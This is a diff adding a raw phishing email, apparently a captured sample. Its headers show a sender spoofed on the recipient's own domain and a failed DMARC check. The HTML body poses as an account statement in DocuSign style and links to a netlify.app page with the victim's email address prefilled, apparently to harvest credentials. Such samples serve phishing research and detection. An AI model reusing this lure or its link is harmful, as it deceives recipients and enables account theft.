@@ -1,0 +1,44 @@
+Return-Path: <Payable.zingerpie@kfcreview.com>
+Received: from kfcreview.com (101.pool90-175-185.dynamic.orange.es [90.175.185.101])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 8svuk4na0cmgudlqjrsgcebd7vf7tnu8i4795b01
+ for zingerpie@kfcreview.com;
+ Thu, 05 Feb 2026 17:31:54 +0000 (UTC)
+Received-SPF: none (spfCheck: 90.175.185.101 is neither permitted nor denied by domain of kfcreview.com) client-ip=90.175.185.101; envelope-from=Payable.zingerpie@kfcreview.com; helo=kfcreview.com;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 90.175.185.101 is neither permitted nor denied by domain of kfcreview.com) client-ip=90.175.185.101; envelope-from=Payable.zingerpie@kfcreview.com; helo=kfcreview.com;
+ dmarc=fail header.from=kfcreview.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIL2hXZmRyRGZqTnFjNG9XdlJDYUdKL3R4WmFMZEtYMzFVWVljM0RLWXhKN3FHbld4a05GdGs5cFJQU2FTZ2k4eU05MS9pcVczdTdJUUhKUTlZaDdubFpERlZUM1FEWWZ5U1QxaEJJWXgxRThjamxmME5xVUZ2bm9aSUowM1A4dkZLNXlneFkvaDNPcEhHQVp6ZXExajZzRWY5b0dUYlpoRTZucGVRYWM3aHR4clpGTGZaaUZ2ZW5CMnI3R3Z3RGg5M3ZTc3Zsa01iaStOcjV5MThkejJ5QW56eExha3MrQmk4QnhFM1ZxajB1M3VXT2JmTzJnZDJoTlY1SEtOQlUxTGlQRmVBd2NvWGx1cTFhTnJNMnZNVVU5NlZTU1IyczB4Q3JGKzhWZC9LaVZIY2N4bGFTbmlUbUxEdjE1MUk2NFU9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=7VzmraNmxVuXZrCx+2viY8mlGkAlFHMyjvhcslobyt1PhE1rFSE3Jijyb9U194V4HdZ23CbLRZO6GC2eNnyOEWiPX2wG3umbH0quZpai60/hfZfGZoMMRlzb18Jc/W9RBsnba+j0cEFK6BF3Uye1f/1JJEg1NdvRaFnEQn5Aw5w=; c=relaxed/simple; s=ndjes4mrtuzus6qxu3frw3ubo3gpjndv; d=amazonses.com; t=1770312715; v=1; bh=N5U0d3iMErHV7mlEonZPn9qsvffoUG/u8WChbo8Ib1c=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: noreply<Payable.zingerpie@kfcreview.com>
+To: zingerpie@kfcreview.com
+Subject:  Account Statement sent to zingerpie@kfcreview.com  Received 5/2/2026 18:31:53!
+Date: 05 Feb 2026 18:31:53 +0100
+Message-ID: <20260205183153.EF4700A9FDC23509@kfcreview.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<P><BR>Please find your latest account statement available . You can review=
+ your statement and complete the acknowledgment process by clicking the lin=
+k below. </P>
+<P><A href=3D"https://ubiquitous-kitten-638d05.netlify.app/?email=3Dzingerp=
+ie@kfcreview.com" rel=3Dnoreferrer target=3D_blank>View Your Account Statem=
+ent</A> </P>
+<P>If you have any questions regarding your statement, please contact us at=
+ your earliest convenience. </P>
+<P>Thank you for your continued business. </P>
+<P>&nbsp;</P>
+<P>Kind regards,<BR></P>
+<HR>
+
+<P style=3D"FONT-SIZE: 11px; COLOR: #666"><STRONG>Confidentiality Notice:</=
+STRONG> This message and any documents transmitted via DocuSign are confide=
+ntial and intended solely for the recipient. If received in error, please n=
+otify the sender and delete it immediately. </P></BODY></HTML>
